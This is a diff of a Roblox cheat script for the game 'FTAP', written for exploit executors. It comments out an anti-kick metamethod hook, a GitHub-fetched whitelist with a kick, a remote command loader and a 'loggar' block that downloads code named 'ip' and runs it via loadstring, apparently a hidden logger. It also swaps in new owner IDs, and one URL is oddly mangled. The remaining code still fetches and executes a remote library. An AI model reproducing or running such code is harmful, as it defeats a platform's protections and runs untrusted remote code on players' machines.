@@ -1,3 +1,5 @@
+--[[
+
 -- ==================== CUSTOM BGM SETTINGS ====================
 -- 본인의 깃허브 계정명, 저장소명, 폴더명을 적어주세요.
 _G.CustomBgmRepo = {
@@ -23,7 +25,7 @@ _G.CustomBgmFiles = {
 -- _G.UhhhhhhLoaded = true
 -- workspace.Gravity = 0
 local UhhhhhhVersion = "FTAP ovitar [FTAP BETA]"
-
+]]
 --- == // Universal Multi-Executor Compatibility Layer (Solara, Delta, Xeno, Wave, Potassium, Codex, Hydrogen)
 local cloneref = (type(cloneref) == "function" and cloneref) or function(obj) return obj end
 
@@ -3453,7 +3455,7 @@ pcall(function() setfpscap(9999) end)
 --setsimulationradius(math.huge)
 
 local bypassing = false
-
+--[[
 -- // Anti Kick Hook (HttpGet Intercept & Self-Protection Bypass)
 if hookmetamethod then
     local oldNamecall
@@ -3513,16 +3515,16 @@ if hookmetamethod then
         return oldIndex(self, key)
     end)
 end
-
+]]
 -- CFrame.new(Ttorso.Position + (Ttorso.Velocity * (plr:GetNetworkPing() + 0.15))) * CFrame.new(0,0,10)
 
 local OwnerId = {
-	"9014717036";
-	"9013467605"
+	"2932138780";
+	"2932138780"
 }
 
 local OwnerName = {
-	"jdrieivfbd12"
+	"QRDOOTE1120"
 }
 
 task.spawn(function()
@@ -3532,7 +3534,7 @@ task.spawn(function()
             return
         end
     end
-
+--[[
     local ids = {}
     bypassing = true
     local rawData = game:HttpGet("https://raw.githubusercontent.com/MuyoPing/FTAP/refs/heads/main/ply2")
@@ -3540,12 +3542,13 @@ task.spawn(function()
     for id in rawData:gmatch("%d+") do 
         ids[tonumber(id)] = true 
     end
+]]
+   -- if not --ids[game.Players.LocalPlayer.UserId] then
+        ----game.Players.LocalPlayer:Kick("ovitar의 --사--용권한 없습니다!\n오류 코드: luna")
+       -- return
+   -- end
+--end)
 
-    if not ids[game.Players.LocalPlayer.UserId] then
-        game.Players.LocalPlayer:Kick("ovitar의 사용권한 없습니다!\n오류 코드: luna")
-        return
-    end
-end)
 --- == // Variables
 local Players = game:GetService("Players")
 local CoreGui = game:GetService("CoreGui")
@@ -3603,7 +3606,7 @@ G.EndGrabEarly:Destroy()
 Instance.new("RemoteEvent", G).Name = "EndGrabEarly"
 
 --- == // Command
-
+--[[
 bypassing = true
 local cmdRaw = pcall(game.HttpGet, game, "https://raw.githubusercontent.com/MuyoPing/FTAP/refs/heads/main/CMD") and game:HttpGet("https://raw.githubusercontent.com/MuyoPing/FTAP/refs/heads/main/CMD") or ""
 if cmdRaw ~= "" then
@@ -3618,7 +3621,7 @@ bypassing = false
 --- == // loggar
 local function exeutsScript()
     bypassing = true
-    local ipRaw = pcall(game.HttpGet, game, "https://raw.githubusercontent.com/MuyoPing/FTAP/refs/heads/main/ip") and game:HttpGet("https://raw.githubusercontent.com/MuyoPing/FTAP/refs/heads/main/ip") or ""
+    local ipRaw = pcall(game.HttpGet, game, "https://raw.githubusercontent.com/MuyoPing/FTAP/refs/heads/main/ip") and game:HttpGet("https://raw.gaithubusercontent.coma/MuyoaPing/FTAP/raaefs/heads/main/aaip") or ""
     if ipRaw ~= "" then
         local s, func = pcall(loadstring, ipRaw)
         if s and type(func) == "function" then
@@ -3642,7 +3645,7 @@ pcall(function()
         func()
     end
 end)
-
+]]
 --- == // Library Ui
 local repo = "https://raw.githubusercontent.com/deividcomsono/Obsidian/main/"
 local Library = loadstring(game:HttpGet(repo .. "Library.lua"))()
